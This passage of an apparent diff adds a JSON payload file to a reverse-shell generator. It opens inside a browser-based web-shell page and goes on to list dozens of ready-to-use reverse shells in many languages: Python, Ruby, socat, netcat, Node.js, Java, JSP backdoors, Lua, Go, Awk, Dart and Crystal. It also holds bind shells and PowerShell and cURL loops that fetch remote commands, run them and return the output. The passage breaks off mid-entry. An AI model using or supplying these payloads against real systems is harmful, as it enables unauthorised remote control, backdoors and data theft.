_updatePrompt();\r\n                    return;\r\n                }\r\n                makeRequest(\"?feature=pwd\", {}, function(response) {\r\n                    CWD = atob(response.cwd);\r\n                    _updatePrompt();\r\n                });\r\n\r\n            }\r\n\r\n            function escapeHtml(string) {\r\n                return string\r\n                    .replace(/&/g, \"&amp;\")\r\n                    .replace(/</g, \"&lt;\")\r\n                    .replace(/>/g, \"&gt;\");\r\n            }\r\n\r\n            function _updatePrompt() {\r\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\r\n                eShellPrompt.innerHTML = genPrompt(CWD);\r\n            }\r\n\r\n            function _onShellCmdKeyDown(event) {\r\n                switch (event.key) {\r\n                    case \"Enter\":\r\n                        featureShell(eShellCmdInput.value);\r\n                        insertToHistory(eShellCmdInput.value);\r\n                        eShellCmdInput.value = \"\";\r\n                        break;\r\n                    case \"ArrowUp\":\r\n                        if (historyPosition > 0) {\r\n                            historyPosition--;\r\n                            eShellCmdInput.blur();\r\n                            eShellCmdInput.value = commandHistory[historyPosition];\r\n                            _defer(function() {\r\n                                eShellCmdInput.focus();\r\n                            });\r\n                        }\r\n                        break;\r\n                    case \"ArrowDown\":\r\n                        if (historyPosition >= commandHistory.length) {\r\n                            break;\r\n                        }\r\n                        historyPosition++;\r\n                        if (historyPosition === commandHistory.length) {\r\n                            eShellCmdInput.value = \"\";\r\n                        } else {\r\n                            eShellCmdInput.blur();\r\n                            eShellCmdInput.focus();\r\n                            eShellCmdInput.value = commandHistory[historyPosition];\r\n                        }\r\n                        break;\r\n                    case 'Tab':\r\n                        event.preventDefault();\r\n                        featureHint();\r\n                        break;\r\n                }\r\n            }\r\n\r\n            function insertToHistory(cmd) {\r\n                commandHistory.push(cmd);\r\n                historyPosition = commandHistory.length;\r\n            }\r\n\r\n            function makeRequest(url, params, callback) {\r\n                function getQueryString() {\r\n                    var a = [];\r\n                    for (var key in params) {\r\n                        if (params.hasOwnProperty(key)) {\r\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\r\n                        }\r\n                    }\r\n                    return a.join(\"&\");\r\n                }\r\n                var xhr = new XMLHttpRequest();\r\n                xhr.open(\"POST\", url, true);\r\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\r\n                xhr.onreadystatechange = function() {\r\n                    if (xhr.readyState === 4 && xhr.status === 200) {\r\n                        try {\r\n                            var responseJson = JSON.parse(xhr.responseText);\r\n                            callback(responseJson);\r\n                        } catch (error) {\r\n                            alert(\"Error while parsing response: \" + error);\r\n                        }\r\n                    }\r\n                };\r\n                xhr.send(getQueryString());\r\n            }\r\n\r\n            document.onclick = function(event) {\r\n                event = event || window.event;\r\n                var selection = window.getSelection();\r\n                var target = event.target || event.srcElement;\r\n\r\n                if (target.tagName === \"SELECT\") {\r\n                    return;\r\n                }\r\n\r\n                if (!selection.toString()) {\r\n                    eShellCmdInput.focus();\r\n                }\r\n            };\r\n\r\n            window.onload = function() {\r\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\r\n                eShellContent = document.getElementById(\"shell-content\");\r\n                updateCwd();\r\n                eShellCmdInput.focus();\r\n            };\r\n        </script>\r\n    </head>\r\n\r\n    <body>\r\n        <div id=\"shell\">\r\n            <pre id=\"shell-content\">\r\n                <div id=\"shell-logo\">\r\n        ___                         ____      _          _ _        _  _   <span></span>\r\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\r\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\r\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\r\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\r\n|_|                         |___/  \\____/                                  <span></span>\r\n                </div>\r\n            </pre>\r\n            <div id=\"shell-input\">\r\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\r\n                <div>\r\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </body>\r\n\r\n</html>",
+      "meta": [
+        "windows",
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Python #1",
+      "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Python #2",
+      "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Python3 #1",
+      "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Python3 #2",
+      "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Python3 Windows",
+      "command": "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "Python3 shortest",
+      "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+      "meta": [
+        "linux"
+      ]
+    },
+    {
+      "name": "Ruby #1",
+      "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Ruby no sh",
+      "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "socat #1",
+      "command": "socat TCP:{ip}:{port} EXEC:{shell}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "socat #2 (TTY)",
+      "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "sqlite3 nc mkfifo",
+      "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "node.js",
+      "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "node.js #2",
+      "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect({port}, \"{ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return /a/; // Prevents the Node.js application from crashing\r\n})();",
+      "meta": [
+        "linux",
+        "mac",
+        "windows"
+      ]
+    },
+    {
+      "name": "Java #1",
+      "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Java #2",
+      "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Java #3",
+      "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
+      "meta": [
+        "windows",
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Java Web",
+      "command": "<%@\r\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n% >\r\n<%!\r\nstatic class StreamConnector extends Thread\r\n{\r\n        InputStream is;\r\n        OutputStream os;\r\n        StreamConnector(InputStream is, OutputStream os)\r\n        {\r\n                this.is = is;\r\n                this.os = os;\r\n        }\r\n        public void run()\r\n        {\r\n                BufferedReader isr = null;\r\n                BufferedWriter osw = null;\r\n                try\r\n                {\r\n                        isr = new BufferedReader(new InputStreamReader(is));\r\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\r\n                        char buffer[] = new char[8192];\r\n                        int lenRead;\r\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r\n                        {\r\n                                osw.write(buffer, 0, lenRead);\r\n                                osw.flush();\r\n                        }\r\n                }\r\n                catch (Exception ioe)\r\n                try\r\n                {\r\n                        if(isr != null) isr.close();\r\n                        if(osw != null) osw.close();\r\n                }\r\n                catch (Exception ioe)\r\n        }\r\n}\r\n%>\r\n\r\n<h1>JSP Backdoor Reverse Shell</h1>\r\n\r\n<form method=\"post\">\r\nIP Address\r\n<input type=\"text\" name=\"ipaddress\" size=30>\r\nPort\r\n<input type=\"text\" name=\"port\" size=10>\r\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\r\n</form>\r\n<p>\r\n<hr>\r\n\r\n<%\r\nString ipAddress = request.getParameter(\"ipaddress\");\r\nString ipPort = request.getParameter(\"port\");\r\nif(ipAddress != null && ipPort != null)\r\n{\r\n        Socket sock = null;\r\n        try\r\n        {\r\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r\n                Runtime rt = Runtime.getRuntime();\r\n                Process proc = rt.exec(\"cmd.exe\");\r\n                StreamConnector outputConnector =\r\n                        new StreamConnector(proc.getInputStream(),\r\n                                          sock.getOutputStream());\r\n                StreamConnector inputConnector =\r\n                        new StreamConnector(sock.getInputStream(),\r\n                                          proc.getOutputStream());\r\n                outputConnector.start();\r\n                inputConnector.start();\r\n        }\r\n        catch(Exception e) \r\n}\r\n%>",
+      "meta": [
+        "windows",
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Java Two Way",
+      "command": "<%\r\n    /*\r\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n     */\r\n%>\r\n\r\n<%@page import=\"java.lang.*\"%>\r\n<%@page import=\"java.io.*\"%>\r\n<%@page import=\"java.net.*\"%>\r\n<%@page import=\"java.util.*\"%>\r\n\r\n<html>\r\n<head>\r\n    <title>jrshell</title>\r\n</head>\r\n<body>\r\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n    <input TYPE=\"text\" NAME=\"shell\">\r\n    <input TYPE=\"submit\" VALUE=\"Send\">\r\n</form>\r\n<pre>\r\n<%\r\n    // Define the OS\r\n    String shellPath = null;\r\n    try\r\n    {\r\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n            shellPath = new String(\"/bin/sh\");\r\n        } else {\r\n            shellPath = new String(\"cmd.exe\");\r\n        }\r\n    } catch( Exception e ){}\r\n    // INNER HTML PART\r\n    if (request.getParameter(\"shell\") != null) {\r\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\r\n        Process p;\r\n        if (shellPath.equals(\"cmd.exe\"))\r\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\r\n        else\r\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n            out.println(disr);\r\n            disr = dis.readLine();\r\n        }\r\n    }\r\n    // TCP PORT PART\r\n    class StreamConnector extends Thread\r\n    {\r\n        InputStream wz;\r\n        OutputStream yr;\r\n        StreamConnector( InputStream wz, OutputStream yr ) {\r\n            this.wz = wz;\r\n            this.yr = yr;\r\n        }\r\n        public void run()\r\n        {\r\n            BufferedReader r  = null;\r\n            BufferedWriter w = null;\r\n            try\r\n            {\r\n                r  = new BufferedReader(new InputStreamReader(wz));\r\n                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n                char buffer[] = new char[8192];\r\n                int length;\r\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n                {\r\n                    w.write( buffer, 0, length );\r\n                    w.flush();\r\n                }\r\n            } catch( Exception e ){}\r\n            try\r\n            {\r\n                if( r != null )\r\n                    r.close();\r\n                if( w != null )\r\n                    w.close();\r\n            } catch( Exception e ){}\r\n        }\r\n    }\r\n \r\n    try {\r\n        Socket socket = new Socket( \"{ip}\", {port} ); // Replace with wanted ip and port\r\n        Process process = Runtime.getRuntime().exec( shellPath );\r\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n        out.println(\"port opened on \" + socket);\r\n     } catch( Exception e ) {}\r\n%>\r\n</pre>\r\n</body>\r\n</html>",
+      "meta": [
+        "windows",
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Javascript",
+      "command": "String command = \"var host = '{ip}';\" +\r\n                       \"var port = {port};\" +\r\n                       \"var cmd = '{shell}';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print ('Connected');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
+      "meta": [
+        "linux",
+        "mac",
+        "windows"
+      ]
+    },
+    {
+      "name": "Groovy",
+      "command": "String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "telnet",
+      "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "zsh",
+      "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Lua #1",
+      "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
+      "meta": [
+        "linux"
+      ]
+    },
+    {
+      "name": "Lua #2",
+      "command": "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
+      "meta": [
+        "linux",
+        "windows"
+      ]
+    },
+    {
+      "name": "Golang",
+      "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+      "meta": [
+        "linux",
+        "mac",
+        "windows"
+      ]
+    },
+    {
+      "name": "Vlang",
+      "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Awk",
+      "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Dart",
+      "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
+      "meta": [
+        "linux",
+        "mac",
+        "windows"
+      ]
+    },
+    {
+      "name": "Crystal (system)",
+      "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "Crystal (code)",
+      "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    }
+  ],
+  "bind": [
+    {
+      "name": "Python3 Bind",
+      "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
+      "meta": [
+        "bind",
+        "mac",
+        "linux",
+        "windows"
+      ]
+    },
+    {
+      "name": "PHP Bind",
+      "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
+      "meta": [
+        "bind",
+        "mac",
+        "linux",
+        "windows"
+      ]
+    },
+    {
+      "name": "nc Bind",
+      "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
+      "meta": [
+        "bind",
+        "mac",
+        "linux"
+      ]
+    },
+    {
+      "name": "Perl Bind",
+      "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
+      "meta": [
+        "bind",
+        "mac",
+        "linux"
+      ]
+    }
+  ],
+  "hoax": [
+    {
+      "name": "Windows CMD cURL",
+      "command": "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell IEX",
+      "command": "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell IEX Constr Lang Mode",
+      "command": "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell Outfile",
+      "command": "$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell Outfile Constr Lang Mode",
+      "command": "$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "Windows CMD cURL https",
+      "command": "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell IEX https",
+      "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell Constr Lang Mode IEX https",
